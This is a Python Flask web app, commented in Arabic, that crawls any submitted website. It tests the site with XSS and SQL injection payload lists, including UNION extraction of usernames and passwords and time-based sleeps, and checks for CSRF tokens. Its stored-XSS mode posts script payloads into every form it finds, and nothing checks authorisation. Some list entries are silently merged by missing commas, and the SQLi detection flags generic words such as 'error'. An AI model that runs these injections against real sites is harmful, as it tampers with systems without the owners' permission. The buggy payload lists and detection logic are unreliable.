from flask import Flask, render_template, request, jsonify, session  # استيراد كائن Flask والدوال الخاصة بالقوالب والطلبات والجلسات
import requests  # استيراد مكتبة requests لإرسال طلبات HTTP
from urllib.parse import urljoin, urlparse, parse_qs  # استيراد دوال لمعالجة الروابط وتقسيمها
from bs4 import BeautifulSoup  # استيراد BeautifulSoup لتحليل HTML واستخراج العناصر
import os
import secrets

app = Flask(__name__)  # إنشاء تطبيق Flask جديد
app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(32)

# إعدادات عامة للطلبات
HEADERS = {  # ترويسة عامة نرسلها مع كل طلب HTTP
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) 4L1-Check"  # تعريف User-Agent يشبه متصفح حقيقي مضاف له اسم الأداة
}
DEFAULT_TIMEOUT = 12       # مهلة الانتظار الافتراضية لكل طلب HTTP بالثواني
MAX_RETRIES = 3            # أقصى عدد مرات إعادة المحاولة عند فشل الطلب

# Payloads شائعة
XSS_PAYLOADS = [  # قائمة بالبايلودز المستخدمة لاختبار ثغرات XSS
    "<script>alert(1)</script>",  # بايلود جافاسكربت بسيط
    "'\"><script>alert(1)</script>",  # بايلود لكسر السياق ثم حقن سكربت
    "<img src=x onerror=alert(1)>",  # بايلود XSS باستخدام صورة مع onerror
    "<svg/onload=alert(1)>"  # بايلود XSS باستخدام عنصر SVG
    
    "<body onload=alert(1)>",  # تنفيذ جافاسكربت عند تحميل الصفحة
    "<iframe srcdoc=\"<script>alert(1)</script>\">",  # حقن سكربت داخل Iframe
    "<svg><script>alert(1)</script></svg>",  # سكربت داخل SVG
    "<input autofocus onfocus=alert(1)>",  # تنفيذ سكربت عند التركيز على input
    "<a href=javascript:alert(1)>X</a>",  # رابط ينفذ جافاسكربت مباشرة
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # سكربت مشفر URL encoding
    "<img src=x onerror=confirm(1)>",  # استبدال alert بـ confirm
    "<div style=\"background-image:url(javascript:alert(1))\">",  # حقن من خلال CSS
    "<form action=javascript:alert(1)><input type=submit>",  # تنفيذ سكربت عند ضغط زر
    "<math><mi xlink:href=\"javascript:alert(1)\">",  # XSS عبر MathML
    "<object data=javascript:alert(1)>",  # حقن عبر object
    "<details open ontoggle=alert(1)>",  # تنفيذ XSS عند فتح التفاصيل
    "<marquee onstart=alert(1)>",  # تنفيذ عند بدء الحركة
    "<video src=x onerror=alert(1)>",  # XSS عبر عنصر فيديو
    "<audio src=x onerror=alert(1)>",  # XSS عبر عنصر Audio
    "<embed src=\"javascript:alert(1)\">"  # حقن باستخدام embed
]

SQLI_PAYLOADS = [  # قائمة بالبايلودز المستخدمة لاختبار SQL Injection
    "' OR '1'='1",  # محاولة حقن شرط صحيح دائمًا
    "' OR 1=1 --",  # حقن مع تعليق بقية الاستعلام
    "admin' --"  # حقن بسيط شائع

    "' OR '1'='1' --",  # دمج شرط صحيح مع تعليق
    "' OR '1'='1' /*",  # تعليق باستخدام /* بدل --
    "\" OR \"1\"=\"1\" --",  # تجاوز عبر استخدام علامات الاقتباس المزدوجة
    "' OR 1=1#",  # استخدام # كتعليق مثل MySQL
    "' OR 1=1/*",  # تعليق متعدد الأسطر لقطع الاستعلام
    "' OR 'a'='a",  # شرط صحيح بديل
    "' OR ''='",  # كسر الاستعلام عبر قيمة فارغة
    "') OR ('1'='1",  # حقن داخل استعلامات فرعية
    "' OR EXISTS(SELECT 1)",  # اختبار وجود الصفوف
    "' UNION SELECT NULL --",  # محاولة إجراء UNION
    "' UNION SELECT 1,2 --",  # اختبار عدد الأعمدة
    "' UNION SELECT username,password FROM users --",  # محاولة سحب بيانات
    "' AND SLEEP(3) --",  # اختبار SQLi من نوع Time-based
    "' WAITFOR DELAY '00:00:03' --",  # Time-based لـ MSSQL
    "' OR pg_sleep(3) --",  # Time-based لـ PostgreSQL
    "' AND 1=CONVERT(int,(SELECT 1)) --",  # اختبار خطأ SQL من نوع CAST
    "\" OR 1=1 /*"  # حقن بسيط باستخدام اقتباس مزدوج وتعليق
]

CSRF_KEYWORDS = ["csrf", "token", "authenticity_token", "xsrf"]  # كلمات تدل على وجود حقل حماية من CSRF في النماذج


# =============================
# دالة طلب HTTP مع إعادة محاولات
# =============================
def http_request(method: str, url: str, **kwargs):  # تعريف دالة لإرسال طلب HTTP مع إعادة المحاولة عند الفشل
    """إرسال طلب HTTP مع إعادة المحاولة عند الفشل."""  # شرح وظيفة الدالة
    for attempt in range(1, MAX_RETRIES + 1):  # تكرار على عدد المحاولات المسموحة
        try:  # محاولة إرسال الطلب
            resp = requests.request(  # استدعاء requests.request لإرسال الطلب
                method=method,  # نوع الطلب (GET/POST/...إلخ)
                url=url,  # عنوان الرابط الهدف
                headers=HEADERS,  # إرسال الترويسات المعرفة مسبقاً
                timeout=DEFAULT_TIMEOUT,  # تعيين المهلة الافتراضية
                **kwargs  # أي معاملات إضافية مثل params أو data
            )
            return resp  # إذا نجح الطلب، نرجع الاستجابة مباشرة
        except Exception as e:  # في حالة حدوث أي خطأ أثناء الطلب
            print(f"[HTTP][{method.upper()}] {attempt}/{MAX_RETRIES} error on {url}: {e}")  # طباعة رسالة خطأ تحتوي على رقم المحاولة والرابط
    return None  # إذا فشلت كل المحاولات نرجع None


# =============================
# التحقق من أن الرابط قابل للوصول
# =============================
def is_valid_url(url: str) -> bool:  # دالة تتحقق من صلاحية الرابط
    resp = http_request("get", url, allow_redirects=True)  # إرسال طلب GET مع السماح بإعادة التوجيه
    return resp is not None  # إذا حصلنا على استجابة نعتبر الرابط صالح


# =============================
# Crawler ذكي للموقع (داخل نفس الدومين)
# =============================
def crawl_site(base_url: str, max_pages: int = 25):  # دالة تزحف داخل الموقع وتجمع روابط صفحاته
    visited = set()  # مجموعة لحفظ الروابط التي قمنا بزيارتها
    to_visit = [base_url]  # قائمة بالروابط التي يجب زيارتها (نبدأ بالرابط الأساسي)
    pages = []  # قائمة الصفحات التي سيتم فحصها لاحقاً

    base_parsed = urlparse(base_url)  # تحليل الرابط الأساسي إلى أجزاء
    base_netloc = base_parsed.netloc  # أخذ الدومين الأساسي (host)

    while to_visit and len(visited) < max_pages:  # نستمر ما دام هناك روابط لزيارتها وعدد الصفحات أقل من الحد
        url = to_visit.pop(0)  # أخذ أول رابط من قائمة الانتظار
        if url in visited:  # إذا تم زيارته من قبل نتجاوزه
            continue
        visited.add(url)  # إضافة الرابط لقائمة المزارة

        resp = http_request("get", url)  # إرسال طلب GET لجلب الصفحة
        if resp is None:  # إذا فشل الطلب نكمل للرابط التالي
            continue

        content_type = resp.headers.get("Content-Type", "")  # الحصول على نوع المحتوى من الترويسات
        # نهتم فقط بصفحات HTML
        if "text/html" not in content_type:  # إذا لم تكن الصفحة HTML نتجاهل الرابط
            continue

        pages.append(url)  # إضافة الرابط لقائمة الصفحات التي سيتم فحصها

        soup = BeautifulSoup(resp.text, "html.parser")  # تحليل الـ HTML باستخدام BeautifulSoup

        for a in soup.find_all("a", href=True):  # البحث عن جميع الروابط <a> التي تحتوي على href
            href = a["href"].strip()  # قراءة قيمة الرابط وإزالة الفراغات

            # تجاهل mailto, javascript, #
            if href.startswith(("mailto:", "javascript:", "#")):  # تجاهل الروابط الغير مفيدة للفحص
                continue

            full_url = urljoin(url, href)  # تحويل الرابط النسبي إلى رابط كامل
            parsed = urlparse(full_url)  # تحليل الرابط الجديد

            # داخل نفس الدومين فقط
            if parsed.netloc != base_netloc:  # إذا كان الرابط على دومين مختلف نتجاهله
                continue

            # إزالة الفراجمات
            cleaned_url = parsed._replace(fragment="").geturl()  # إزالة جزء #fragment من الرابط

            if cleaned_url not in visited and cleaned_url not in to_visit:  # إذا كان الرابط جديداً ولم يزر من قبل
                to_visit.append(cleaned_url)  # إضافته لقائمة الروابط التي يجب زيارتها

    # تأكد أن الصفحة الأساسية موجودة
    if base_url not in pages:  # إذا لم تُضف الصفحة الأساسية
        pages.insert(0, base_url)  # نضيفها يدوياً في بداية القائمة

    print(f"[CRAWL] base={base_url} -> pages={len(pages)}")  # طباعة ملخص عن عدد الصفحات المزارة
    return pages  # إعادة قائمة الصفحات


# =============================
# استخراج الفورمات من صفحة HTML
# =============================
def extract_forms(html: str, url: str):  # دالة لاستخراج جميع نماذج الإدخال (forms) من صفحة HTML
    soup = BeautifulSoup(html, "html.parser")  # تحليل HTML باستخدام BeautifulSoup
    forms = []  # قائمة لتخزين معلومات الفورمات

    for form in soup.find_all("form"):  # البحث عن جميع عناصر <form>
        action = form.get("action")  # قراءة قيمة action (الرابط الهدف للفورم)
        method = form.get("method", "get").lower()  # قراءة نوع الطلب (GET أو POST)، الافتراضي GET
        full_url = urljoin(url, action) if action else url  # تحويل action إلى رابط كامل أو استخدام رابط الصفحة

        inputs = []  # قائمة أسماء حقول الإدخال
        for inp in form.find_all(["input", "textarea"]):  # البحث عن حقول input و textarea
            name = inp.get("name")  # قراءة اسم الحقل
            if name:  # إذا الحقل له اسم
                inputs.append(name)  # ضمه إلى القائمة

        if inputs:  # إذا وجدنا حقولاً في هذا الفورم
            forms.append({  # إضافة الفورم للقائمة كمُعجم
                "url": full_url,  # رابط الفورم النهائي
                "method": method,  # نوع الطلب
                "inputs": inputs  # أسماء حقول الإدخال
            })

    return forms  # إعادة قائمة الفورمات


# =============================
# Stored XSS (حقن + كشف)
# =============================
def send_stored_xss_payload(form: dict, payload: str):  # دالة لإرسال بايلود إلى نموذج بهدف تخزينه (Stored XSS)
    data = {field: payload for field in form["inputs"]}  # إنشاء بيانات الطلب بحيث كل حقل يحمل قيمة البايلود

    try:  # محاولة إرسال الطلب
        if form["method"] == "post":  # إذا كان الفورم يستخدم POST
            http_request("post", form["url"], data=data)  # إرسال الطلب باستخدام POST
        else:  # إذا كان الفورم GET
            http_request("get", form["url"], params=data)  # إرسال الطلب باستخدام GET مع الباراميترات
    except Exception as e:  # إذا حدث خطأ أثناء الطلب
        print(f"[STORED-XSS][SEND] error on {form['url']}: {e}")  # طباعة رسالة خطأ


def detect_stored_xss(urls, payload: str):  # دالة للتحقق من ظهور البايلود في صفحات أخرى (علامة Stored XSS)
    findings = []  # قائمة النتائج
    for url in urls:  # المرور على جميع الصفحات
        resp = http_request("get", url)  # طلب الصفحة
        if resp is None:  # إذا فشل الطلب
            continue
        if payload in resp.text:  # إذا وُجد البايلود داخل محتوى الصفحة
            findings.append({  # إضافة نتيجة جديدة لقائمة النتائج
                "type": "Stored XSS",  # نوع الثغرة
                "url": url,  # الرابط الذي ظهرت فيه الثغرة
                "payload": payload,  # البايلود المستعمل
                "severity": "HIGH",  # مستوى الخطورة
                "description": "تم اكتشاف Stored XSS: البيانات المحقونة ظهرت في صفحة أخرى."  # وصف مختصر للثغرة
            })
    return findings  # إعادة قائمة الثغرات المكتشفة


# =============================
# Reflected XSS (GET + Forms)
# =============================
def check_xss(page_url: str):  # دالة لفحص Reflected XSS في صفحة معينة
    results = []  # قائمة لحفظ النتائج

    resp = http_request("get", page_url)  # طلب الصفحة المستهدفة
    if resp is None:  # إذا فشل الطلب
        return results  # نرجع قائمة فارغة

    html = resp.text  # محتوى الصفحة HTML
    parsed = urlparse(page_url)  # تحليل الرابط إلى أجزاء
    base = parsed._replace(query="", fragment="").geturl()  # رابط الصفحة بدون باراميترات أو fragment
    query = parse_qs(parsed.query)  # قراءة باراميترات الـ GET كقاموس

    # 1) فحص XSS عبر باراميترات GET
    if query:  # إذا كانت هناك باراميترات في الرابط
        params_to_test = list(query.keys())[:4]  # اختيار حتى 4 باراميترات كحد أقصى للاختبار
        for param in params_to_test:  # المرور على كل باراميتر سيتم اختباره
            for payload in XSS_PAYLOADS:  # المرور على كل بايلود متاح
                test_params = {}  # قاموس الباراميترات الذي سنستخدمه في الطلب
                for k, v in query.items():  # المرور على كل باراميتر موجود في الرابط الأصلي
                    if k == param:  # إذا كان هذا الباراميتر هو الذي نختبره
                        test_params[k] = payload  # نعطيه قيمة البايلود
                    else:
                        test_params[k] = v[0]  # البقية يأخذون قيمهم الأصلية
                resp2 = http_request("get", base, params=test_params)  # إرسال الطلب بالباراميترات الجديدة
                if resp2 is not None and payload in resp2.text:  # إذا ظهر البايلود في الاستجابة
                    results.append({  # إضافة نتيجة تشير إلى وجود Reflected XSS
                        "type": "Reflected XSS",
                        "url": resp2.url,
                        "payload": payload,
                        "severity": "HIGH",
                        "description": f'تم اكتشاف Reflected XSS في الباراميتر "{param}".'
                    })
    else:  # لو مافي باراميترات، نجرب inject=payload
        # لو مافي باراميترات، نجرب inject=payload
        for payload in XSS_PAYLOADS:  # المرور على كل بايلود
            resp2 = http_request("get", base, params={"inject": payload})  # إرسال الطلب مع باراميتر inject
            if resp2 is not None and payload in resp2.text:  # إذا ظهر البايلود في الرد
                results.append({  # تسجيل ثغرة محتملة
                    "type": "Reflected XSS",
                    "url": resp2.url,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": 'الصفحة تعكس قيمة الباراميتر "inject" (احتمال Reflected XSS).'
                })

    # 2) فحص XSS عن طريق الفورمات في نفس الصفحة
    forms = extract_forms(html, page_url)  # استخراج الفورمات الموجودة في الصفحة
    for form in forms[:5]:  # حد أقصى 5 فورمات للصفحة
        for payload in XSS_PAYLOADS[:3]:  # استخدام أول 3 بايلودز للاختبار
            data = {name: payload for name in form["inputs"]}  # إعطاء كل حقل في الفورم قيمة البايلود
            if form["method"] == "post":  # إذا كان الفورم يستعمل POST
                resp_f = http_request("post", form["url"], data=data)  # إرسال الطلب عبر POST
            else:
                resp_f = http_request("get", form["url"], params=data)  # إرسال الطلب عبر GET
            if resp_f is not None and payload in resp_f.text:  # إذا ظهر البايلود في الرد
                results.append({  # تسجيل ثغرة Reflected XSS عبر الفورم
                    "type": "Reflected XSS (Form)",
                    "url": resp_f.url,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": "تم اكتشاف Reflected XSS عبر نموذج إدخال (form)."
                })

    return results  # إعادة قائمة النتائج


# =============================
# SQL Injection (GET)
# =============================
def check_sqli(page_url: str):  # دالة لفحص SQL Injection على رابط معين
    results = []  # قائمة لحفظ نتائج الفحص

    parsed = urlparse(page_url)  # تحليل الرابط
    base = parsed._replace(query="", fragment="").geturl()  # رابط بدون باراميترات أو fragment
    query = parse_qs(parsed.query)  # قراءة الباراميترات

    error_keywords = ["sql", "syntax", "mysql", "odbc", "error", "warning"]  # كلمات تدل على أخطاء قاعدة البيانات في الرد

    if not query:  # إذا لا توجد باراميترات في الرابط
        # إذا ما فيه باراميترات → نضيف id
        for payload in SQLI_PAYLOADS:  # المرور على كل بايلود
            resp = http_request("get", base, params={"id": payload})  # إرسال الطلب مع باراميتر id
            if resp is None:  # إذا فشل الطلب
                continue
            text_low = resp.text.lower()  # تحويل النص إلى حروف صغيرة للفحص
            if any(err in text_low for err in error_keywords):  # إذا وجدنا أي كلمة خطأ
                results.append({  # نضيف نتيجة ثغرة محتملة
                    "type": "SQL Injection",
                    "url": resp.url,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": "استجابة تحتوي على رسائل خطأ قاعدة بيانات (احتمال SQLi في id)."
                })
    else:  # إذا كان هناك باراميترات في الرابط
        params_to_test = list(query.keys())[:4]  # اختيار حتى 4 باراميترات للفحص
        for param in params_to_test:  # المرور على كل باراميتر
            for payload in SQLI_PAYLOADS:  # المرور على كل بايلود
                test_params = {}  # قاموس الباراميترات الذي سنرسله
                for k, v in query.items():  # المرور على الباراميترات الأصلية
                    if k == param:  # إذا كان الباراميتر هو الذي نختبره
                        test_params[k] = payload  # تعيين البايلود له
                    else:
                        test_params[k] = v[0]  # إعطاء البقية قيمهم الأصلية

                resp = http_request("get", base, params=test_params)  # إرسال الطلب مع الباراميترات المعدلة
                if resp is None:  # إذا فشل الطلب
                    continue

                text_low = resp.text.lower()  # نص الاستجابة بحروف صغيرة
                if any(err in text_low for err in error_keywords):  # إذا ظهرت كلمات خطأ قاعدة بيانات
                    results.append({  # تسجيل ثغرة SQL Injection محتملة
                        "type": "SQL Injection",
                        "url": resp.url,
                        "payload": payload,
                        "severity": "HIGH",
                        "description": f"تم اكتشاف مؤشرات SQLi (رسائل خطأ) في الباراميتر \"{param}\"."
                    })

    return results  # إعادة النتائج


# =============================
# CSRF (نماذج POST بدون Token)
# =============================
def check_csrf(page_url: str):  # دالة لفحص نماذج CSRF في صفحة معينة
    findings = []  # قائمة لحفظ النتائج

    resp = http_request("get", page_url)  # جلب محتوى الصفحة
    if resp is None:  # إذا فشل الطلب
        return findings  # إعادة قائمة فارغة

    soup = BeautifulSoup(resp.text, "html.parser")  # تحليل الصفحة باستخدام BeautifulSoup

    for form in soup.find_all("form"):  # المرور على جميع الفورمات
        method = form.get("method", "get").lower()  # قراءة نوع الطلب للفورم
        if method != "post":  # نهتم غالباً بفورمات POST فقط في CSRF
            # نهتم غالباً بفورمات POST فقط في CSRF
            continue

        inputs = form.find_all("input")  # جلب جميع حقول الإدخال في الفورم
        tokens = [  # البحث عن أي حقل يشبه CSRF token
            i for i in inputs
            if any(k in (i.get("name", "") or "").lower() for k in CSRF_KEYWORDS)
        ]

        if not tokens:  # إذا لم نجد أي توكن CSRF
            findings.append({  # تسجيل ثغرة محتملة
                "type": "CSRF",
                "url": page_url,
                "payload": "No CSRF token",
                "severity": "MEDIUM",
                "description": "نموذج POST بدون أي حقل CSRF token (عرضة لهجوم CSRF)."
            })

    return findings  # إعادة النتائج


# =============================
# Routes
# =============================
@app.route("/")  # تعريف الراوت الرئيسي للموقع على المسار /
def home():  # دالة تعرض الصفحة الرئيسية
    return render_template(  # إعادة صفحة HTML إلى المتصفح
        "index.html",  # اسم القالب الذي سيتم عرضه
        site=session.get("last_site"),  # تمرير آخر رابط تم فحصه ليظهر في الواجهة
        results=session.get("last_results")  # تمرير آخر نتائج فحص لعرضها في الواجهة
    )


@app.route("/scan", methods=["POST"])  # تعريف مسار /scan الذي يستقبل طلبات POST للفحص
def scan():  # دالة تنفيذ عملية الفحص
    data = request.get_json() or {}  # قراءة بيانات JSON القادمة من الواجهة
    site = data.get("site")  # استخراج رابط الموقع من البيانات
    scan_type = data.get("vuln_type")  # استخراج نوع الثغرة المطلوب فحصها

    if not site or not scan_type:  # إذا كانت البيانات ناقصة
        return jsonify({"success": False, "error": "بيانات الطلب غير مكتملة"}), 400  # إعادة خطأ 400 مع رسالة

    if not is_valid_url(site):  # التحقق من أن الرابط صالح وقابل للوصول
        return jsonify({"success": False, "error": "خطأ: الرابط غير صالح أو غير متاح"}), 400  # إعادة خطأ في الرابط

    # زحف الموقع
    pages = crawl_site(site, max_pages=25)  # استدعاء الزاحف للحصول على صفحات من نفس الموقع

    results = []  # قائمة لتجميع نتائج الفحص
    forms = []  # قائمة لتجميع الفورمات لاستخدامها في Stored XSS

    # استخراج الفورمات مرة واحدة (لمرحلة Stored XSS)
    for page in pages:  # المرور على كل صفحة تم العثور عليها
        resp = http_request("get", page)  # طلب محتوى الصفحة
        if resp is None:  # إذا فشل الطلب
            continue
        forms += extract_forms(resp.text, page)  # استخراج فورمات هذه الصفحة وضمها للقائمة

    # Stored XSS
    PAY = "<script>alert('stored')</script>"  # بايلود خاص لفحص Stored XSS
    if scan_type == "stored_xss":  # إذا كان نوع الفحص Stored XSS
        for form in forms:  # المرور على كل فورم تم استخراجه
            send_stored_xss_payload(form, PAY)  # إرسال البايلود لتخزينه
        results += detect_stored_xss(pages, PAY)  # فحص الصفحات للبحث عن البايلود المخزن

    # Reflected XSS / SQLi / CSRF
    for page in pages:  # المرور على كل صفحة للمزيد من أنواع الفحص
        if scan_type == "xss":  # إذا نوع الفحص XSS
            results += check_xss(page)  # استدعاء دالة فحص XSS
        elif scan_type == "sqli":  # إذا نوع الفحص SQL Injection
            results += check_sqli(page)  # استدعاء دالة فحص SQLi
        elif scan_type == "csrf":  # إذا نوع الفحص CSRF
            results += check_csrf(page)  # استدعاء دالة فحص CSRF

    session["last_site"] = site  # حفظ آخر موقع تم فحصه في الجلسة
    session["last_results"] = results  # حفظ النتائج في الجلسة لعرضها عند إعادة تحميل الصفحة

    return jsonify({  # إعادة الرد على شكل JSON للواجهة الأمامية
        "success": True,  # نجاح العملية
        "results": results,  # قائمة الثغرات التي تم اكتشافها
        "pages_tested": len(pages),  # عدد الصفحات التي تم فحصها
        "total_found": len(results)  # إجمالي عدد الثغرات المكتشفة
    })


if __name__ == "__main__":  # نقطة تشغيل البرنامج مباشرة (وليس كمكتبة مستوردة)
    app.run(host="127.0.0.1", port=8000)